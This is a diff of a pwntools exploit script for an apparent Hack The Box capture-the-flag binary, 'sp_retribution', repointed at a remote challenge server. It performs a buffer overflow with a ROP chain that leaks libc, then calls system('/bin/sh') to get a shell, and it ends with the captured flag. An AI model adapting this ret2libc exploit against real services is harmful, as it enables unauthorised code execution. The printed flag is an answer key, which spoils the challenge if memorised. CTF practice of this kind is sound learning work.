@@ -8,6 +8,9 @@
 cyclic -l vaaa
 84
 84+4 == 88
+
+!!!Debugging in local windows machine is OK, but in lab's ubuntu nuc failed as the pop_rdi_ret address cannot access...
+
 '''
 
 from pwn import *
@@ -19,9 +22,9 @@ libc = ELF('./glibc/libc.so.6')
 
 padding = b'A'*(88)
 
-io = process('./sp_retribution')
-#ip, port = "68.183.47.198", 31876
-#io = remote(ip, port)
+#io = process('./sp_retribution')
+ip, port = "144.126.232.205", 32161
+io = remote(ip, port)
 
 io.sendlineafter('>> ','2')
 
@@ -32,7 +35,7 @@ io.sendlineafter('y = ', '')
 base = io.recvuntil(' (y/n): ').split(b'\n')[-2]
 base = u32(base[1:])<<16
 
-#print(hex(base))
+print(hex(base))
 
 pop_rdi_ret = 0x0000000000000d33
 
@@ -42,13 +45,10 @@ rop_chain += p64(base + elf.plt['puts'])
 rop_chain += p64(base + elf.symbols['missile_launcher'])
 
 payload1 = padding + rop_chain
-log.info(rop.dump())
 
 io.sendline(payload1)
+io.recvuntil(b'\x1b[1;34m\n')
 
-print(io.recvuntil(b'\x1b[1;34m\n'))
-print(io.recvall())
-'''
 puts_addr = u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))
 log.info("Leaked server's libc address, puts(): "+hex(puts_addr))
 
@@ -62,12 +62,19 @@ rop_libc = ROP(libc)
 rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
 rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
 payload2 = padding + rop_libc.chain()
-log.info(rop_libc.dump())
 
 io.sendlineafter('y = ', '[0x53e5854620fb399f]')
 io.sendlineafter(' (y/n): ', payload2)
 io.interactive()
-'''
-'''
 
+'''
+!!!Some times you just need to re-try several times...
+
+$ ls
+core
+flag.txt
+glibc
+sp_retribution
+$ cat flag.txt
+HTB{w3_f1n4lly_m4d3_1t}
 '''
